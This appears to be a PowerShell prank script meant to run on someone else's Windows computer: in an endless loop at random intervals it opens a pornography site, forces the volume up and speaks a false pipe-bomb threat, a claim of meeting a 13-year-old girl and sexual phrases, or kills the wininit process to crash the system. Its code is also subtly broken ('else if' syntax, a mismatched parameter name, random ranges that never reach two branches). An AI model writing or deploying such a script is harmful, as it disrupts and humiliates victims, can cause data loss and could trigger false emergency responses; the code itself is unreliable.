# Setup TTS etc
Add-Type -AssemblyName System.Speech
$speaker = New-Object System.Speech.Synthesis.SpeechSynthesizer
function set_AudioLevel($audioLevel){$wshShell = new-object -com wscript.shell; 1..50 | % {$wshShell.SendKeys([char]174)}; $audioLevel = $audioLevel / 2;1..$audioLevel | % {$wshShell.SendKeys([char]175)}}

while ($true){
    # Sleep for a random amount of time
    $randomWaitTime = Get-Random -Minimum 10 -Maximum 300
    Start-Sleep -Seconds $randomWaitTime

    # Decide action
    $randomNumber = Get-Random -Minimum 1 -Maximum 8

    if ($randomNumber -eq 1){
        explorer.exe "https://porn.tgm.one"
    } else if ($randomNumber -eq 2){
        set_AudioLevel -Volume 100
        $speaker.Speak("I HAVE A PIPE BOMB THIS IS NOT A JOKE THERE IS A PIPE BOMB IN MY BACKPACK")
    } else if ($randomNumber -eq 3){
        set_AudioLevel -Volume 100
        $speaker.Speak("I HAVE BEEN EDGING FOR 48 HOURS")
    } else if ($randomNumber -eq 4){
        set_AudioLevel -Volume 100
        $speaker.Speak("ERM ACTUALLY")
    } else if ($randomNumber -eq 5){
        set_AudioLevel -Volume 100
        $speaker.Speak("WAP")
    } else if ($randomNumber -eq 6){
        set_AudioLevel -Volume 100
        $speaker.Speak("RICHARD JOYCE THE THIRD")
    } else if ($randomNumber -eq 7){
        set_AudioLevel -Volume 100
        $speaker.Speak("I AM HERE TO MEET A 13 YEAR OLD GIRL")
    } else if ($randomNumber -eq 8){
        Stop-Process -Name wininit
    } else if ($randomNumber -eq 9){
        explorer.exe "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
    }
}